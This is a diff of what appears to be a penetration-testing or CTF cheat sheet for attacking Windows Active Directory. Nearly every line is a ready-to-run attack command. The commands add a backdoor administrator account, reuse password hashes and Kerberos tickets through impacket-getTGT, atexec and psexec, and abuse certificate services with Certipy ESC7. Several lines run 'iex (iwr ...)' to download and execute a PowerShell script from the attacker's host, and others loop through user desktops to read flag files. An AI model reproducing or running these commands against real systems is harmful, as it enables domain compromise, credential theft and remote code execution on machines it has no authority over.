@@ -201,14 +201,14 @@ net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
 net user administrator 123qweasdF!
 
 ## GG - ROOT FLAG
-impacket-atexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
-impacket-psexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
-impacket-atexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':' "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
-impacket-psexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':' "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-getTGT -dc-ip $TARGET $DOM/'administrator' -hashes ':$HASH'; export KRB5CCNAME='administrator.ccache'; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
+
 impacket-getTGT -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'; export KRB5CCNAME='administrator.ccache'
-impacket-getTGT -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':'; export KRB5CCNAME='administrator.ccache'
-impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-atexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-atexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':$HASH' "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 impacket-psexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-psexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+impacket-psexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':$HASH' "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 Get-ChildItem 'C:\Users' -Directory | ForEach-Object { Get-Content "$($_.FullName)\Desktop\user.txt","$($_.FullName)\Desktop\root.txt" -ErrorAction SilentlyContinue }
 gg ''
 
@@ -585,7 +585,7 @@ https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage
 
 +---------- .ccache ----------+
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME='$USERNAME.ccache'
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes ':'; export KRB5CCNAME='$USERNAME.ccache'
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes ':$HASH'; export KRB5CCNAME='$USERNAME.ccache'
 
 +---------- ESC7 ----------+
 certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -add-officer '$USERNAME' -target $DC
